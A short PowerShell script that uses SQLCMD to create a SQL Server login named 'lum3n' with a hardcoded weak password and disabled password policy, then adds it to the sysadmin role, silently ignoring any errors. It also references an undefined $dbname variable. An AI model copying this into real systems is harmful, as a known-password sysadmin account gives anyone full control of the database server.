param(
    [Parameter(Mandatory=$false)]  [string]$user,
    [Parameter(Mandatory=$false)]  [string]$password,
    [Parameter(Mandatory=$false)]  [switch]$useIntegratedSecurity
)

try
{
    $query = "
    USE [master]
    GO

    If not Exists (select loginname from master.dbo.syslogins where name = 'lum3n')
    Begin
        CREATE LOGIN [lum3n] WITH PASSWORD=N'123Lum3n', DEFAULT_DATABASE=[master], CHECK_EXPIRATION=OFF, CHECK_POLICY=OFF;
        ALTER SERVER ROLE [sysadmin] ADD MEMBER [lum3n];
    End
    "

    if($useIntegratedSecurity.IsPresent){
        SQLCMD.EXE -E -d $dbname -Q  $query
    }
    else{
        SQLCMD.EXE -U $user -P $password -Q $query
    }
}
catch{}





